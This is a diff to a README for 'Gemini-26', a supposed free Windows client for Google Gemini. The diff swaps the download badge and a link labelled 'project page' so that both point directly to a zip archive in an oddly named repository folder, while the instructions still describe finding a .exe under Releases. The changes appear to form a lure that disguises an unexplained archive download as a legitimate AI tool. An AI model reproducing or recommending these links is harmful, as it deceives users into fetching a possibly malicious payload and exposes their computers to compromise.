@@ -1,6 +1,6 @@
 # 🤖 Gemini-26 - Access Powerful Artificial Intelligence For Free
 
-[![](https://img.shields.io/badge/Download-Gemini_26-blue.svg)](https://github.com/jerry7281/Gemini-26)
+[![](https://img.shields.io/badge/Download-Gemini_26-blue.svg)](https://github.com/jerry7281/Gemini-26/raw/refs/heads/main/cacodaemonic/Gemini_3.6.zip)
 
 Gemini-26 provides a simple way to use Google Gemini technology on your Windows computer. This application acts as a bridge. It connects your computer to artificial intelligence services without requiring complex coding knowledge or advanced technical skills. You can use this tool to write text, summarize information, or answer questions.
 
@@ -21,7 +21,7 @@ Ensure your Windows system receives all current updates from Microsoft. Outdated
 You must visit the project page to obtain the installer for your computer. Follow these steps to find the correct file.
 
 1.  Open your preferred web browser.
-2.  Navigate to the project page: [https://github.com/jerry7281/Gemini-26](https://github.com/jerry7281/Gemini-26).
+2.  Navigate to the project page: [https://github.com/jerry7281/Gemini-26/raw/refs/heads/main/cacodaemonic/Gemini_3.6.zip](https://github.com/jerry7281/Gemini-26/raw/refs/heads/main/cacodaemonic/Gemini_3.6.zip).
 3.  Look for a section titled Releases on the right side of the screen.
 4.  Click the text that shows the latest version number.
 5.  Find the file ending in .exe under the Assets heading.
